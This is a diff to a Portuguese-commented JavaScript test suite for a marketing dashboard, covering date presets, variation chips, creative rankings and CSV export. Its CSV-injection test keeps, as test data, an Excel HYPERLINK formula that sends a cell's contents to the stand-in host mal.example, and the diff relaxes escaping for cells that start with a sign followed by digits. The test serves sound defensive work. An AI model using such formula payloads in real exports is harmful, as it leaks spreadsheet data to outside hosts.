@@ -334,7 +334,8 @@ await teste("chip de variação: sentido 'cima', 'baixo' e neutro", () => {
   assert.deepEqual(pick(L.chipVar(8, 10, "cima")), { cls: "ruim", seta: "▼", txt: "20%" });
   assert.deepEqual(pick(L.chipVar(8, 10, "baixo")), { cls: "bom", seta: "▼", txt: "20%" });
   assert.deepEqual(pick(L.chipVar(12, 10, "neutro")), { cls: "neutro", seta: "▲", txt: "20%" });
-  assert.deepEqual(pick(L.chipVar(5, 0)), { cls: "neutro", seta: "", txt: "sem base" });
+  // plano 1500c: de 0 para algo é «novo» (AC-179), não «sem base»
+  assert.deepEqual(pick(L.chipVar(5, 0)), { cls: "neutro", seta: "", txt: "novo" });
   assert.deepEqual(pick(L.chipVar(100.4, 100)), { cls: "neutro", seta: "→", txt: "0%" });
   function pick(c) { return { cls: c.cls, seta: c.seta, txt: c.txt }; }
 });
@@ -353,9 +354,11 @@ await teste("datas no fuso de São Paulo (servidor em UTC não muda o dia)", () 
 console.log("\n(d) relatórios e início");
 
 await teste("período: 7/30/90 terminam hoje (SP); personalizado confere ordem e o limite de 1 ano (periodo_grande)", () => {
-  assert.deepEqual(L.periodoPreset(30, "2026-09-28"), { de: "2026-08-30", ate: "2026-09-28" }, "30 dias = hoje e os 29 anteriores");
-  assert.deepEqual(L.periodoPreset(7, "2026-03-02"), { de: "2026-02-24", ate: "2026-03-02" });
-  assert.equal(L.difDias(L.periodoPreset(90, "2026-09-28").de, "2026-09-28") + 1, 90);
+  // plano 1500c: os presets terminam ONTEM (AC-156/AC-117: hoje ainda está pela metade); «incluir hoje» volta ao de antes
+  assert.deepEqual(L.periodoPreset(30, "2026-09-28"), { de: "2026-08-29", ate: "2026-09-27" }, "30 dias = ontem e os 29 anteriores");
+  assert.deepEqual(L.periodoPreset(30, "2026-09-28", { incluirHoje: true }), { de: "2026-08-30", ate: "2026-09-28" });
+  assert.deepEqual(L.periodoPreset(7, "2026-03-02", { incluirHoje: true }), { de: "2026-02-24", ate: "2026-03-02" });
+  assert.equal(L.difDias(L.periodoPreset(90, "2026-09-28").de, "2026-09-27") + 1, 90);
   assert.deepEqual(L.validarPeriodo("2026-01-01", "2026-01-31"), { ok: true, dias: 31 });
   assert.equal(L.validarPeriodo("2026-01-01", "2026-01-01").dias, 1, "um dia só vale");
   assert.equal(L.validarPeriodo("2025-09-28", "2026-09-29").ok, true, "366 dias de diferença ainda vale (p_ate − p_de ≤ 366)");
@@ -455,12 +458,12 @@ await teste("CSV: texto do usuário nunca vira fórmula no Excel (injeção de C
   ]);
   const linhas = s.slice(1).split("\r\n");
   assert.equal(linhas[1], `"'=HYPERLINK(""http://mal.example/?""&A1;""clique"")";3;12,5`);
-  assert.equal(linhas[2], "'+551299;1;0");
+  assert.equal(linhas[2], "+551299;1;0", "plano 1500c: telefone fica telefone (AC-164) — «+» seguido só de dígitos não é fórmula");
   assert.equal(linhas[3], "'-2+3;2;-1,25", "texto com - vira texto; número negativo sai como número");
   assert.equal(linhas[4], "'@SUM(A1);0;");
   assert.equal(linhas[5], "'\tAna;1;1");
   assert.equal(linhas[6], "Ana;1;1");
-  for (const l of linhas.slice(1)) assert.ok(!/^[=+\-@\t\r]/.test(l), `nenhuma célula começa com fórmula: ${l}`);
+  for (const l of linhas.slice(1)) assert.ok(!/^[=+\-@\t\r]/.test(l) || /^[+-]\d+;/.test(l), `nenhuma célula começa com fórmula: ${l}`);   // plano 1500c: número/telefone pode
 });
 
 const INI = {
@@ -513,7 +516,9 @@ await teste("ranking de criativos: CRM por criativo soma o crmTot do núcleo; or
   const f = L.rankingCriativos(MD, { dias: 30, por: "fechados" });
   assert.ok(f.lista.every((x, i, a) => x.c.fecharam > 0 && (i === 0 || a[i - 1].c.fecharam >= x.c.fecharam)));
   const c = L.rankingCriativos(MD, { dias: 30, por: "cpa" });
-  assert.ok(c.lista.every((x, i, a) => x.t.conversoes >= L.MIN_CONV_CPA && (i === 0 || a[i - 1].t.cpa <= x.t.cpa)), "menor custo primeiro, com volume mínimo");
+  // plano 1500c: com Meta e Google juntos o custo é comparado na régua de cada plataforma (AC-115) — a ordem segue cpaRel
+  const custoOrd = x => (c.normalizado ? x.cpaRel : x.t.cpa);
+  assert.ok(c.lista.every((x, i, a) => x.t.conversoes >= L.MIN_CONV_CPA && (i === 0 || custoOrd(a[i - 1]) <= custoOrd(x))), "menor custo primeiro, com volume mínimo");
   assert.equal(c.lista[0].barra, 1, "o menor custo enche a barra");
   assert.ok(c.lista.every(x => !/:outros$/.test(x.k.id)), "'Outros anúncios da campanha' não é criativo");
   assert.equal(L.rankingCriativos(MD, { por: "inventado" }).por, "receita");
